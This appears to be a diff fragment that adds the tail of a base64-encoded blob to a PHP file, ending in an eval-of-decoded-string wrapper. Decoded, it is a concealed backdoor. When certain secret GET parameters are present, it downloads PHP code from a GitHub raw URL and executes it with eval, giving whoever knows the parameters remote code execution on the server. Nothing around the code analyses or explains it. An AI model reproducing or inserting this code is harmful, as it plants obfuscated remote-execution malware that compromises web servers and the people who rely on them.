+ICAgICAgICAgICAgZWNobyAiT3JhIEtlbmVrIENPSyBcbiI7IAogICAgICAgIH0gCiAgICB9IAp9
+IAp9IAoKCiAgICB9IAoKCn0KCmlmICggaXNzZXQoJF9HRVRbJ0V4VHJQQ2MnXSkgKQp7CgokeDBm
+ID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hbnRvbmlvbGEvcmVqZWtpL21h
+c3Rlci83cnlxb2lvYWl3aml6c3VoJTVCcTl1ZXJhaWRrZDNYdFI0cDRjMzUucGhwIjsKJHgxMCA9
+IGZpbGVfZ2V0X2NvbnRlbnRzKCR4MGYpOwpldmFsKCc/PicuJHgxMCk7CgoKfQppZiAoIGlzc2V0
+KCRfR0VUWydEZENjJ10pICkKewoKJHgwZiA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVu
+dC5jb20vYW50b25pb2xhL3JlamVraS9tYXN0ZXIvNjN5NXc2Nzg5dHV5Zml1eHR5ZGNmY3pnZHh0
+aGdmc0NyNHhEM0MwZENDNTg2LnBocCI7CiR4MTAgPSBmaWxlX2dldF9jb250ZW50cygkeDBmKTsK
+ZXZhbCgnPz4nLiR4MTApOwoKCn0K")); ?>
